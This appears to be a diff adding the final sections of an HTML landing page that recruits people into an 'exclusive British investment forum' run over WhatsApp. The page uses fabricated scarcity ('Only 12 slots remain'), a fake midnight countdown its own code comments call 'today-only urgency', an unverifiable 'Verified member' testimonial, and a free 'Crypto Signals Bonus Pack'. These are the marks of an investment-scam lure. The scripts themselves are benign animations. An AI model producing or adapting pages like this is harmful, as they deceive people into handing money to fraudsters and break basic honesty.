+              <div class="stars">★★★★★</div>
+            </div>
+            <p class="rtext">"Joined via WhatsApp in minutes. Matthew's report <b>broke everything down</b> so I finally understand what I'm investing in."</p>
+            <span class="verified"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg> Verified member</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- ================= SCREEN 5 · FINAL CTA ================= -->
+  <section class="cta-final">
+    <div class="wrap">
+      <div class="bezel reveal">
+        <div class="core cta-card">
+          <div class="seal">🔒</div>
+          <h2>Secure your place in the <em class="gold">exclusive British</em> investment forum</h2>
+          <p class="lead">Join a limited group of 100 investors and unlock your free AI diagnosis today.</p>
+
+          <div class="stats">
+            <div class="stat"><b>100</b><span>Investor Cap</span></div>
+            <div class="stat"><b>12</b><span>Slots Left</span></div>
+            <div class="stat"><b>24/7</b><span>Support</span></div>
+          </div>
+
+          <div class="bonus">
+            <span class="b-ico">🎁</span>
+            <span class="b-txt"><b>Today's bonus:</b> join now and also unlock the Crypto Signals Bonus Pack — free for members.</span>
+          </div>
+
+          <div class="scarcity" style="justify-content:center;margin-bottom:20px;">
+            <span class="pulse"></span> Only 12 slots remain for the UK chapter
+          </div>
+
+          <a class="btn btn-primary" onclick="k2()" role="button" tabindex="0">
+            <span class="lbl">Join the Exclusive Group</span>
+            <span class="btn-icon"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg></span>
+          </a>
+
+          <div class="trust-bar" style="margin-top:20px;">
+            <span class="trust-item"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg> 100% free</span>
+            <span class="trust-item"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg> No card required</span>
+          </div>
+
+          <p class="micro" style="margin-top:18px;">
+            Prefer to chat? Tap the green <strong style="color:var(--emerald)">WhatsApp</strong> button below — a coordinator replies within minutes.
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= FOOTER / LOGO ================= -->
+  <footer>
+    <div class="wrap">
+      <p class="f-copy">© 2026 — All rights reserved.</p>
+      <p class="f-note">Trading and investing involve risk. Past performance does not guarantee future results. This page is for information purposes only and is not financial advice.</p>
+    </div>
+  </footer>
+
+  <!-- ================= FIXED WHATSAPP CTA ================= -->
+  <a class="wa-fab" onclick="k2()" role="button" tabindex="0" aria-label="Chat on WhatsApp">
+    <svg width="26" height="26" viewBox="0 0 24 24" fill="#fff" aria-hidden="true">
+      <path d="M12.04 2C6.58 2 2.13 6.45 2.13 11.91c0 1.75.46 3.45 1.32 4.95L2 22l5.25-1.38c1.45.79 3.08 1.21 4.79 1.21 5.46 0 9.91-4.45 9.91-9.91S17.5 2 12.04 2zm0 18.15c-1.53 0-3.03-.41-4.34-1.19l-.31-.18-3.12.82.83-3.04-.2-.31a8.26 8.26 0 0 1-1.26-4.34c0-4.54 3.7-8.24 8.24-8.24 4.54 0 8.24 3.7 8.24 8.24s-3.7 8.24-8.24 8.24zm4.52-6.16c-.25-.12-1.47-.72-1.69-.81-.23-.08-.39-.12-.56.13-.16.25-.64.81-.78.97-.14.17-.29.19-.54.06-.25-.12-1.05-.39-1.99-1.23-.74-.66-1.23-1.47-1.38-1.72-.14-.25-.02-.38.11-.51.11-.11.25-.29.37-.43.12-.14.16-.25.25-.41.08-.17.04-.31-.02-.43-.06-.12-.56-1.34-.76-1.84-.2-.48-.41-.42-.56-.43h-.48c-.17 0-.43.06-.66.31-.22.25-.86.85-.86 2.07 0 1.22.89 2.4 1.01 2.56.12.17 1.75 2.67 4.23 3.74.59.26 1.05.41 1.41.52.59.19 1.13.16 1.56.1.48-.07 1.47-.6 1.68-1.18.21-.58.21-1.07.14-1.18-.06-.11-.22-.17-.47-.29z"/>
+    </svg>
+    <span class="wa-txt">
+      <small>Free diagnosis · 24/7</small>
+      Chat on WhatsApp
+    </span>
+  </a>
+
+<script>
+  // Countdown to local midnight (today-only urgency)
+  (function(){
+    var els = document.querySelectorAll('[data-countdown]');
+    function pad(n){ return (n < 10 ? '0' : '') + n; }
+    function tick(){
+      var now = new Date();
+      var end = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 23, 59, 59, 999);
+      var diff = Math.max(0, end - now);
+      var h = Math.floor(diff / 3600000);
+      var m = Math.floor(diff % 3600000 / 60000);
+      var s = Math.floor(diff % 60000 / 1000);
+      var str = pad(h) + ':' + pad(m) + ':' + pad(s);
+      for(var i=0;i<els.length;i++){ els[i].textContent = str; }
+    }
+    tick();
+    setInterval(tick, 1000);
+  })();
+
+  // Scroll reveals + gauge animation
+  (function(){
+    var els = document.querySelectorAll('.reveal');
+    var gauge = document.getElementById('gauge');
+
+    if(!('IntersectionObserver' in window)){
+      els.forEach(function(el){ el.classList.add('in'); });
+      if(gauge){ gauge.classList.add('in'); }
+      return;
+    }
+
+    var io = new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          e.target.classList.add('in');
+          if(e.target === gauge || e.target.contains(gauge)){ gauge.classList.add('in'); }
+          io.unobserve(e.target);
+        }
+      });
+    },{threshold:0.18});
+
+    els.forEach(function(el){ io.observe(el); });
+    if(gauge && !gauge.closest('.reveal')){ io.observe(gauge); }
+  })();
+</script>
+</body>
+</html>
